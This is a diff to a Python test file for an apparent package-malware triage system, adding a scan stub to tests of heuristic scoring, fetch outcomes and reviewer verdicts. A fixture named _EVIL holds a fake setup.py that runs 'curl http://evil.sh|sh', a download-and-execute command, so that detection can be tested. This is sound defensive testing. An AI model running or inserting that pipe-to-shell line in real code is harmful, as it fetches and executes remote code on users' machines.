@@ -66,13 +66,14 @@ _EVIL = (b"import os, base64, requests\n"
          b"os.system('curl http://evil.sh|sh')\n")
 
 
-def test_heuristic_only_high_score_is_queued_without_an_alert(tmp_path):
+def test_heuristic_only_high_score_is_queued_without_an_alert(tmp_path, scan_stub):
     cfg = _cfg(tmp_path, reviewer_enabled=False)
     conn = _conn(cfg)
     art = ArtifactSet("p", "1.1", "1.0", "sdist", {"setup.py": _EVIL, "p/__init__.py": _EVIL},
                       {"setup.py": b"x = 1\n", "p/__init__.py": b""}, {}, added_binaries=[],
                       is_new_package=False, maintainer_metadata=None, added_dep_findings=[])
-    orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
+    orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5),
+                                  scan_stub.dl(art))
     score = conn.execute("SELECT triage_score FROM releases WHERE version='1.1'").fetchone()[0]
     assert score >= 150                  # far past threshold_t: the strongest heuristic case
     assert store.get_stage(conn, "p", "1.1") == "pending_review"
@@ -90,9 +91,11 @@ def test_heuristic_only_high_score_is_queued_without_an_alert(tmp_path):
     (fetcher.RefusedToExtract("members"), "refused_to_extract"),
     (fetcher.MetadataGone("404"), "metadata_gone"),
 ])
-def test_fetch_outcomes_never_malicious(tmp_path, result, stage):
+def test_fetch_outcomes_never_malicious(tmp_path, result, stage, scan_stub):
     cfg = _cfg(tmp_path)
     conn = _conn(cfg)
+    if isinstance(result, (ArtifactSet, fetcher.RefusedToExtract)):
+        result = scan_stub.dl(result, "p", "1.1")
     orchestrator._process_fetched(cfg, conn, None, None, NewRelease("p", "1.1", 5), result)
     _assert_never_malicious(conn, stage)
 
@@ -224,7 +227,7 @@ def test_no_code_outside_the_model_parser_or_adjudicate_mints_malicious():
     assert found == []
 
 
-def test_one_oversized_source_alone_goes_to_no_content_not_malicious(tmp_path):
+def test_one_oversized_source_alone_goes_to_no_content_not_malicious(tmp_path, scan_stub):
     # A PKG-INFO bump (not a build file) plus one oversized .py: triage escalates (weight 40), the model has
     # nothing readable to see, so the release is a model-`none` UNREVIEWED item, never malicious.
     cfg = _cfg(tmp_path)
@@ -234,7 +237,8 @@ def test_one_oversized_source_alone_goes_to_no_content_not_malicious(tmp_path):
                                            "sha256": "ab"}],
                       is_new_package=False, maintainer_metadata=None, added_dep_findings=[], too_large=("p/big.py",))
     rvw = reviewer.Reviewer(cfg, backend=_Backend())
-    orchestrator._process_fetched(cfg, conn, rvw, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
+    orchestrator._process_fetched(cfg, conn, rvw, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5),
+                                  scan_stub.dl(art))
     assert store.get_stage(conn, "p", "1.1") == "needs_adjudication"
     row = conn.execute("SELECT classification, model FROM verdicts").fetchone()
     assert (row["classification"], row["model"]) == ("suspicious", "none")
